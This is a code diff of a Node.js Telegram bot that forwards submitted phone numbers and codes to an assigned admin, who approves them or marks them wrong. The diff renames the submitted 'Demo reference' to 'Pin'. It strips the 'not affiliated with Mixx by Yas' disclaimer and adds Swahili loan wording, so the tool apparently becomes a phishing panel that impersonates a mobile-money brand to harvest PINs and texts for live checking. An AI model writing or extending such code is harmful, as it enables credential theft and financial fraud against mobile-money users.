@@ -51,11 +51,11 @@ async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.q
 function decisionKeyboard(stage,id){const buttons=stage==='details'?[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong reference',callback_data:`decide:wrong_id:${stage}:${id}`}]]:[[ {text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong reference',callback_data:`decide:wrong_id:${stage}:${id}`},{text:'❌ Wrong Text',callback_data:`decide:wrong_text:${stage}:${id}`} ]];return {inline_keyboard:buttons};}
 async function notifyAdmins(message,keyboard,assignedAdmin=null){if(!assignedAdmin)return;const r=await pool.query('SELECT active FROM orange_demo_admins WHERE chat_id=$1',[String(assignedAdmin)]);if(!r.rows[0]?.active)return;await send(String(assignedAdmin),message,{reply_markup:keyboard});}
 async function notifyDetails(a){
- const msg=`🟣 <b>New demo application — review</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🧾 Demo reference: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nMixx-inspired independent demo.`;
+ const msg=`🟣 <b>New demo application — review</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🧾 Pin: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nMixx-inspired independent demo.`;
  await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
 }
 async function notifyReference(a){
- const msg=`🟣 <b>Mixx-inspired demo text submitted — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Demo phone: <code>${esc(a.phone)}</code>\n📝 Demo text: <code>${esc(a.reference_text||'')}</code>\n📌 Status: DEMO TEXT PENDING\n\nIndependent demo — not affiliated with Mixx by Yas.`;
+ const msg=`🟣 <b>Mixx by- text submitted — review required</b>\n\n🆔 pin: <code>${esc(a.id)}</code>\n📞 phone: <code>${esc(a.phone)}</code>\n📝 text: <code>${esc(a.reference_text||'')}</code>\n📌 Status: TEXT PENDING\n\nmkopo wa Mixx by Yas.`;
  await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
 }
 app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'Mixx-inspired independent Tanzania demo'}));
